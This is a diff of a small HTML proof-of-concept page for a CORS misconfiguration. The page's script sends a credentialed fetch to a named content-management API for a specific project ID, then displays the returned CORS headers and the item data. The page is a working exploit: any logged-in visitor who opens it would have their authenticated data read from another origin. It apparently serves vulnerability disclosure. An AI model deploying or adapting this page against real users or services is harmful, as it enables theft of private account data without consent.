@@ -1,24 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Kontent CORS PoC</title>
+  <title>CORS Credentialed PoC</title>
 </head>
 <body>
   <h2>PoC Loaded</h2>
   <pre id="output">Waiting for response...</pre>
 
   <script>
-    fetch("https://manage.kontent.ai/v2/projects/<your_project_id>/items", {
+    fetch("https://manage.kontent.ai/v2/projects/12a3d0c6-d8e7-002b-3a5e-a32d0f275be6/items", {
       method: "GET",
       credentials: "include"
     })
-    .then(res => res.text())
-    .then(data => {
-      document.getElementById("output").textContent = data;
+    .then(response => {
+      const origin = response.headers.get("Access-Control-Allow-Origin");
+      const creds = response.headers.get("Access-Control-Allow-Credentials");
+      return response.text().then(body => {
+        document.getElementById("output").textContent =
+          "Origin: " + origin + "\n" +
+          "Allow-Credentials: " + creds + "\n\n" +
+          "Body:\n" + body;
+      });
     })
-    .catch(err => {
-      document.getElementById("output").textContent = "Error: " + err;
+    .catch(error => {
+      document.getElementById("output").textContent = "Error: " + error;
     });
   </script>
 </body>
 </html>
+
